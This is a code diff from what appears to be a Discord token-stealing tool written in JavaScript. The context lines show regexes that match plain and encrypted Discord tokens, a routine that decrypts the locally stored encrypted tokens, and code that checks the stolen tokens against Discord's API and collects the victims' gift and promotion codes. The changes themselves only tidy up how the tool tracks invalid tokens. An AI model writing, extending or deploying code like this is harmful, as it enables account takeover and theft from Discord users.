@@ -27,8 +27,6 @@ const decryptToken = async (token, key) => {
 };
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
 const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
-const tokensNotWorking = join(os.tmpdir(), generateString(10) + '.tmp');
-writeFileSync(tokensNotWorking, '');
 
 const decryptRickRoll = (path) => {
   return new Promise((resolve) => {
@@ -68,7 +66,6 @@ const decryptRickRoll = (path) => {
 };
 
 const handleTokens = async (tokens, resolve) => {
-  const invalidTokens = readFileSync(tokensNotWorking, 'utf8');
   const userInfo = async (token, source, retry = 0) => {
     try {
       const { data } = await axios.get('https://discord.com/api/v10/users/@me', {
@@ -87,9 +84,7 @@ const handleTokens = async (tokens, resolve) => {
       }
     } catch (e) {
       if (retry === 10) return;
-      if (e.response.status === 401) {
-        writeFileSync(tokensNotWorking, readFileSync(tokensNotWorking, 'utf8') + ',' + token);
-      } else if (e.response.status === 429 && e.response.data.retry_after) {
+      if (e.response.status === 429 && e.response.data.retry_after) {
         await sleep((e.response.data.retry_after * 1000) + 500);
         await userInfo(token, source, retry + 1);
       }
@@ -118,7 +113,7 @@ const handleTokens = async (tokens, resolve) => {
       const { data } = await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
         headers: { Authorization: token, 'User-Agent': userAgent }
       });
-      let info = JSON.parse(readFileSync(jsonFile).toString());
+      let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
       if (!info.gifts) info.gifts = [];
       data.forEach(gift => {
         if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
@@ -132,7 +127,6 @@ const handleTokens = async (tokens, resolve) => {
     }
   };
   for (const { token, source } of tokens) {
-    if (invalidTokens.split(',').includes(token)) return;
     try {
       await userInfo(token, source);
       try {
